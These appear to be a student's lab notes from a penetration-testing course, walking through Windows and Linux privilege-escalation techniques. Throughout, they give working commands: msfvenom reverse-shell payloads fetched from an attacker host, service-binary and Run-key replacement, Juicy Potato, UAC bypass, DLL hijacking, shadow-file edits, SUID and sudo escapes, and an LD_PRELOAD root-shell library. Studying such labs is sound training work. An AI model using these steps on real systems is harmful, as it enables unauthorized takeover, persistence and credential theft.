Privilege Escelation with Powerup

we had access to a kali linux attacker and a windows target machine, we had assumed access of the windows system but used a hta to get a meterpreter session open up with full admin privelages, we basically escelated our privelages and the video shown us 2 ways of doing this, hta and psexec


Privilege Escelation with PrivescCheck

we had access to a kali linux attacker and a windows target machine, we had assumed access of the windows system but used PrivescCheck to to obtain a PrivescCheck Report which shown us vulnerabilities - in this case clear text logon info WinLogon, we found the results that obtained the credentials. again its the same lab, we could use hta, or any way of gaining a meterpreter shell at this point

Unattended Installation

identify the presence of the unattended installation file using PowerUp, from there we cat out the contents, attain the password which we then put on the attackers machine using > echo  "QWRtaW5AMTIz" | base64 -d
which revealed the password: Admin@123
we then logged on the target machine through powershell using runas.exe; 
PS C:\Users\student\Desktop\PowerSploit\Privesc> runas.exe /user:administrator cmd
Enter the password for administrator:
which then gave us escelated privileges
also using cpsexec on msfconsole - using the credentials for a meterpreter session

Windows Credential Manager

with student user we use cmdkey /list and the stored credentials do not show, however we can use runas.exe /savecred /user:administrator cmd - this will login as admin using the credentials even though we cant see them.
- also shown how to use msfvenom, then msfconsole to do webdelivery, creating a command to run on the targets student powershell which opens up a meterpreter sessions.

PowerShell History

C:\Users\student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
this is a file that stores a list of commands that have previously been entered by last users of computer

- Service Exploits

Exploiting Insecure Service Permissions

In this privilege escalation exercise, we begin as a low-privileged student user with access to the PowerSploit framework and the PowerUp.ps1 script, designed to identify common Windows misconfigurations. First, we navigate to the script's directory using cd .\Desktop\PowerSploit\Privesc\ and list the contents with ls. We then launch PowerShell with execution policy bypass using powershell -ep bypass, import the script via . .\PowerUp.ps1, and run the Invoke-PrivescAudit function. This reveals that the student user has modify permissions on FileZilla Server.exe, a potential privilege escalation vector. We confirm this using Get-Acl "C:\Program Files (x86)\FileZilla Server" | Format-List, which shows write access to the FileZilla installation directory.
Next, on the Kali attacker machine, we identify our IP with ip addr and generate a malicious payload using msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali IP> LPORT=4444 -f exe > 'FileZilla Server.exe', ensuring the file is not empty with file 'FileZilla Server.exe'. We serve the payload using a Python HTTP server (python -m SimpleHTTPServer 80) and prepare for the reverse connection by starting msfconsole, using the exploit/multi/handler module, and setting PAYLOAD, LHOST, LPORT, and InitialAutoRunScript post/windows/manage/migrate, followed by exploit.
Back on the Windows machine, we download the malicious payload and overwrite the legitimate binary using:
iwr -UseBasicParsing -Uri 'http://<Kali IP>/FileZilla Server.exe' -OutFile 'C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe', then verify with ls. We then launch services.msc, locate the "FileZilla Server FTP Server" service, and click "Start". The service fails to start with Error 1053, which is expected—it indicates our payload executed. Meanwhile, on Kali, we receive a Meterpreter session as SYSTEM. We navigate to the Administrator’s Downloads folder (cd C:\Users\Administrator\Downloads), list files (ls), and read the flag using cat flag.txt.
This method demonstrates a typical Windows privilege escalation path via service binary replacement, using PowerUp, msfvenom, and Metasploit.

- Windows Registry

Privilege Escalation via Registry AutoRuns

Start by launching Autoruns.exe from C:\Users\student\Desktop\SysinternalsSuite\Autoruns.exe, switch to the Logon tab, and confirm hfs.exe is set to auto-run. Use Get-ACL 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Format-List to verify the student user has write permissions to the Run registry key. Check if you can overwrite the hfs.exe binary with Get-ACL "C:\Program Files\HTTPServer\" | Format-List—if not, proceed with registry-based persistence. Open regedit, go to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, create a new String Value named hacker, and set its value to C:\Users\student\Desktop\tool\program.exe. Then, create the folder using mkdir C:\Users\student\Desktop\tool. On Kali, generate a Meterpreter payload with msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > program.exe, serve it via python -m SimpleHTTPServer 80, and start a listener in Metasploit with the exploit/multi/handler module using the same LHOST and LPORT. On the target, download the payload using iwr -UseBasicParsing -Uri http://10.10.31.2/program.exe -OutFile 'C:\Users\student\Desktop\tool\program.exe'. Double-click the hacker registry key and confirm the value points to the downloaded payload. To trigger execution, run shutdown /l to log off, then reconnect. The payload runs on login, and you get a Meterpreter session on Kali. Finally, navigate to C:\Users\Administrator\Downloads

- Impersonation Attacks

Access Token Impersonation

access token impersonation, first gain a Meterpreter session on a Windows machine. Use getprivs to confirm you have the SeImpersonatePrivilege. Then, run load incognito and list available tokens with list_tokens -u. Find a suitable impersonation token (e.g., for Administrator), then run impersonate_token <DOMAIN\\User>. After impersonation, verify with getuid—you should now be running as the target user. You can now perform actions with that user’s privileges.

MSSQL: Juicy Potato: Privilege Escalation

To escalate privileges with Juicy Potato, I first confirmed the presence of the SeAssignPrimaryTokenPrivilege using whoami /priv. Then, I generated a malicious Meterpreter executable (backdoor.exe) using msfvenom and uploaded it alongside JuicyPotato.exe to the C:\Users\Public\ directory on the target. I launched a Metasploit multi/handler to catch the reverse shell, and from the Meterpreter session, I executed:
JuicyPotato.exe -l 4444 -p C:\Users\Public\backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
This exploited a vulnerable CLSID to impersonate SYSTEM, launching my backdoor payload and granting SYSTEM-level access via a new Meterpreter session.

- Advanced Techniques

Bypassing UAC with UACMe

To elevate privileges using UACMe, first download and extract the tool on your attacker machine, then upload it to a writable location on the target system. Identify the correct method number for the UAC bypass (such as 62 for fodhelper.exe) by referencing UACMe’s documentation. Prepare your payload, such as a reverse shell or cmd.exe, and ensure it matches any naming requirements for the chosen method. Then, from a low-privileged command prompt on the target, execute the UACMe binary with the appropriate method and payload path (e.g., akagi64.exe 62 C:\Users\Public\payload.exe). If the system is vulnerable and UAC auto-elevation is enabled, the payload will be executed with elevated privileges, giving you administrative or SYSTEM-level access without triggering a UAC prompt.

DLL Hijacking

To perform DLL hijacking, start by running the target application and monitor it with Process Monitor (ProcMon) using the filter: Path contains .dll and Result is NAME NOT FOUND. This helps identify missing DLLs the app attempts to load. Once a vulnerable DLL name is found (e.g., example.dll), use a tool like Dependency Walker to check for required exports. Write a malicious DLL in a language like C or C++, exporting the same functions (e.g., DllMain) and embedding your payload (such as a reverse shell or MessageBox). Compile it (e.g., using x86_64-w64-mingw32-gcc) and name it identically: example.dll. Place it in the same directory as the executable (or a writable path loaded first), then run the app:
x86_64-w64-mingw32-gcc -shared -o example.dll malicious.c  
When executed, the application loads your DLL, triggering your payload with its privileges.

- Linux Privilege Escalation

Locally Stored Credentials

On Student login, navigate to the HTML root folder: cd /var/www/html - here we can search for credentials by trying various keywords such as username, password, db_username, db_password, db_user, etc. In this case, db_user worked: grep -nr "db_user" - Cat the required file to find the password for the root user: cat ./local/config/database.inc.php - then type su, enter the password and we are complete.

Misconfigured File Permissions

in the student machine, we can input the following command to look for files (and not symlinks etc) that are writable: find / -not -type l -perm -o+w - We oserve from the result that /etc/shadow is world writable: ls -l /etc/shadow - cat /etc/shadow - We observe that the root password is not set. Adding a known password in the shadow file can escalate to root. Use openssl to generate a password entry: openssl passwd -1 -salt abc password - Copy the generated entry and add it to the root record in /etc/shadow Command: vim /etc/shadow - After making the changes, try to switch to the root user: su - Enter password: password - we are in

Exploiting SUID Binaries

The challenge description points us toward the setuid programs. So, search for all setuid programs: find / -user root -perm -4000 -exec ls -ldb {} \; - We observe that in addition to default programs, setuid bit is set for vim.tiny (a lightweight text editor). Leverage this and use the vim.tiny to modify /etc/sudoers file: vim.tiny /etc/sudoers - Add a new entry for student user which will allow it to use sudo without prompting for password. under # sudoers include, Press i to insert and then add: student ALL=(ALL) NOPASSWD:ALL - After saving the /etc/sudoers file, run /bin/bash as root using sudo: sudo /bin/bash - and we are in.

 Misconfigured SUDO Privileges
 
The video explains how we can check online for misconfigured Sudo Privileges when we discover them. To check the current sudo capabilities: sudo -l - The man entry depicts that the man command can be run using sudo without providing any password. Run it and launch /bin/bash from it: sudo man ls - Command: !/bin/bash - We observe that the escalation to root user is successful. Change to /root directory and retrieve the flag.

Shared Library Injection

Start with checking sudo configuration. Observe that the student user can run apache2 with sudo (as root) without providing any password. Also, LD_PRELOAD environment variable can be set: sudo -l - Create a file (shell.c) with the code:

cat <<EOF > shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
EOF

This code will lead to an elevated shell on execution. Compile the code to create a shared library named shell.so. : gcc -fPIC -shared -o shell.so shell.c -nostartfiles - Once the shell.so is ready, use sudo to change value of LD_PRELOAD variable to path of shell.so and also call the apache2 program. This will lead into execution of the code written in _init() function of the shell.so and launch an elevated shell: sudo LD_PRELOAD=/home/student/shell.so apache2 - and we are in

